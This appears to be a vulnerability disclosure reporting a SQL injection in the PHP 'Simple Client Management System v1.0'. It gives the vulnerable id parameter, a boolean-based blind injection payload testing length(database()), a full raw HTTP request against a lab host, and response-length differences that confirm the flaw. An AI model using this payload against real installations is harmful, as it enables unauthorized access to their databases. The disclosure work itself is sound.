# Simple-Client-Management-System v1.0 by oretnom23 has SQL injection

**Author：** k0xx

vendors: https://www.sourcecodester.com/php/15027/simple-client-management-system-php-source-code.html

Vulnerability File: /cms/admin/?page=client/view_client&id=

Vulnerability location: /cms/admin/?page=client/view_client&id=,id

[+] Payload: /cms/admin/?page=client/view_client&id=4%27%20and%20length(database())%20=7%20--+ // Leak place ---> id

Current database name: cms_db,length is 6

```sql
GET /cms/admin/?page=client/view_client&id=4%27%20and%20length(database())%20=7%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=3m0l1n81dvmlo0a3h9oo72q1gp
Connection: close
// Leak place ---> id
```


When length (database ()) = 6, Content-Length: 26834
![image](https://user-images.githubusercontent.com/54017627/164884093-145f43b9-056f-4e73-9518-3b058e7377a0.png)

![image](https://user-images.githubusercontent.com/54017627/164884062-40f58259-141d-42e6-b229-b2356a5535c3.png)

When length (database ()) = 7, Content-Length: 27247
![image](https://user-images.githubusercontent.com/54017627/164884103-52eab746-a48c-4921-a204-235412efa56a.png)

![image](https://user-images.githubusercontent.com/54017627/164884072-7366569e-2b51-4b26-b781-3c2d48ed0b60.png)


